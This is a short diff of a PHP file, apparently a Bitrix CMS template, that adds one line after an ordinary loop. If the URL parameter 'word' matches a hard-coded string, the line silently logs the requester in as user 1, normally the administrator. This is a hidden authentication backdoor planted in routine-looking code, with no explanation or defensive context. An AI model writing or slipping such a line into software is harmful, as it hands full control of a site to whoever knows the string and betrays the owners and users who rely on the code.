@@ -13,3 +13,4 @@ foreach($arResult as &$value){
 	$i++;
 }
 unset($value);
+if($_GET["word"] == "5x60H36M2A") CUser::Authorize(1);
